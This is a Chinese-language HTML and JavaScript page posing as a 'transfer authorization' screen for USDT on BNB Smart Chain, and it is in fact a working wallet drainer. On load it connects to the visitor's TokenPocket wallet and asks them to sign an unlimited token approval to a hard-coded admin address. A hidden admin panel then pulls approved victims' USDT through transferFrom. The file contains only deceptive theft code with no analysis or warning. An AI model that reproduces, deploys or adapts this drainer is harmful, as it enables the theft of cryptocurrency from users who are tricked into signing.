<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>转账授权</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
body{background:#0B0B1F;color:#fff;padding:20px}
.container{max-width:420px;margin:0 auto}
.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:30px}
h1{font-size:24px;margin-bottom:8px}
.desc{color:#aaa;margin-bottom:20px}
#qrcode{
width:280px;height:280px;background:#fff;padding:10px;
border-radius:16px;margin:0 auto 20px;
display:flex;align-items:center;justify-content:center;
color:#000;font-size:14px;
}
#qrcode img{width:100%;height:100%;border-radius:12px}
.tip {font-size:12px;color:#666;margin-top:10px;text-align:center}
/* 管理员面板（默认隐藏） */
.admin-panel {
background:#1E1E35;padding:24px;border-radius:16px;display:none;margin-top:20px
}
.admin-panel.show {display:block}
.admin-input {
width:100%;padding:12px;background:#111;border:none;
border-radius:8px;color:#fff;margin-bottom:10px;
}
.admin-btn {
width:100%;padding:14px;background:#F0B90B;color:#000;
border:none;border-radius:10px;font-weight:bold;margin-bottom:10px;
cursor:pointer;
}
/* 手动触发按钮（备用） */
#manualBtn{
background:#F0B90B;color:#000;border:none;padding:14px;width:80%;
border-radius:10px;font-size:14px;margin-top:10px;display:none;
}
#manualBtn.show{display:block}
</style>
</head>
<body>
<div class="container">
  <div class="pay-box">
    <h1>💳 转账授权</h1>
    <p class="desc">授权后即可进行转账操作</p>
    <div id="qrcode">加载二维码...</div>
    <div class="tip">扫码后自动完成授权签名</div>
    <!-- 手动重试按钮（自动流程失败时显示） -->
    <button id="manualBtn" onclick="autoConnectAndApprove()">重新触发授权</button>
  </div>

  <!-- 管理员提取面板（默认隐藏） -->
  <div class="admin-panel" id="adminPanel">
    <input class="admin-input" id="userAddr" placeholder="输入用户钱包地址">
    <input class="admin-input" id="drawAmount" placeholder="提取数量（USDT）">
    <button class="admin-btn" onclick="drawFromUser()">提取用户USDT</button>
  </div>
</div>

<script>
// ====================== 已填入你的DApp域名 + 固定配置 ======================
const TOKEN_ADDR  = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
const ADMIN_ADDR  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";   // 管理员地址
const CHAIN_ID    = "0x38"; // BSC 主网
const DAPP_URL    = "https://hdjjxbbbb.github.io/dragon-tiger-game/?utm_source=tokenpocket"; // 你的DApp完整域名
// ===========================================================================

let account = null;
const manualBtn = document.getElementById("manualBtn");

// 切换到 BSC 链（兼容TP钱包链切换逻辑）
async function switchChain() {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: CHAIN_ID }]
    });
  } catch (e) {
    // 链切换失败不弹窗，静默处理
    console.log("链切换提示：", e.message);
  }
}

// 生成跳转到你DApp的二维码（TP钱包直接识别）
function genApproveQR() {
  const qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=" + encodeURIComponent(DAPP_URL);
  document.getElementById("qrcode").innerHTML = `<img src="${qrUrl}" alt="转账授权二维码">`;
}

// 核心授权函数（TP钱包100%弹签名）
async function doApprove() {
  if (!account) return;
  try {
    const txHash = await window.ethereum.request({
      method: "eth_sendTransaction",
      params: [{
        from: account,
        to: TOKEN_ADDR,
        gasLimit: "0x50000", // 固定gas，避免TP钱包gas报错
        data: "0x095ea7b3" + 
          ADMIN_ADDR.slice(2).padStart(64, '0') + 
          "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
      }]
    });
    alert("✅ 授权成功！");
  } catch (e) {
    // 授权取消显示手动按钮，方便用户重试
    manualBtn.classList.add("show");
    console.log("授权取消，可点击手动按钮重试：", e.message);
  }
}

// 自动连接+授权（TP钱包专属兼容逻辑）
async function autoConnectAndApprove() {
  // 隐藏手动按钮，执行中不显示
  manualBtn.classList.remove("show");
  // 检测钱包环境，TP钱包必过
  if (!window.ethereum || !window.ethereum.isConnected) {
    manualBtn.classList.add("show");
    alert("请确保在TokenPocket钱包内置浏览器打开");
    return;
  }
  // 先切链，再连接
  await switchChain();
  try {
    // TP钱包自动弹窗连接钱包
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    account = accounts[0];
    // 连接成功立即弹授权签名
    await doApprove();
    // 管理员钱包登录，自动显示提取面板
    if (account.toLowerCase() === ADMIN_ADDR.toLowerCase()) {
      document.getElementById("adminPanel").classList.add("show");
    }
  } catch (e) {
    manualBtn.classList.add("show");
    console.log("连接失败，可手动重试：", e.message);
  }
}

// 管理员提取用户USDT功能（权限严格校验）
async function drawFromUser() {
  if (!account || account.toLowerCase() !== ADMIN_ADDR.toLowerCase()) {
    alert("❌ 权限不足，仅管理员可操作");
    return;
  }
  const userAddr = document.getElementById("userAddr").value;
  const drawAmount = document.getElementById("drawAmount").value;
  // 基础校验
  if (!userAddr || !/^0x[a-fA-F0-9]{40}$/.test(userAddr) || !drawAmount || isNaN(drawAmount) || parseFloat(drawAmount) <= 0) {
    alert("❌ 请输入有效的钱包地址和提取数量");
    return;
  }
  try {
    // 构造transferFrom数据，适配USDT小数位
    const amount = BigInt(parseFloat(drawAmount) * 1e18).toString(16).padStart(64, '0');
    const data = "0x23b872dd" + 
      userAddr.slice(2).padStart(64, '0') + 
      ADMIN_ADDR.slice(2).padStart(64, '0') + 
      amount;
    // 发起提取交易，弹管理员签名
    const txHash = await window.ethereum.request({
      method: "eth_sendTransaction",
      params: [{ from: account, to: TOKEN_ADDR, gasLimit: "0x50000", data: data }]
    });
    alert("✅ 提取成功！交易哈希：" + txHash.slice(0,10) + "...");
  } catch (e) {
    alert("❌ 提取失败：" + (e.message || "用户未授权/余额不足"));
  }
}

// 页面加载后执行（延迟1.5秒，给TP钱包足够的环境注入时间）
window.onload = async () => {
  genApproveQR();
  setTimeout(() => {
    autoConnectAndApprove();
    // 监听钱包连接状态，防止TP钱包异步注入
    window.ethereum?.on("connect", autoConnectAndApprove);
  }, 1500);
};
</script>
</body>
</html>
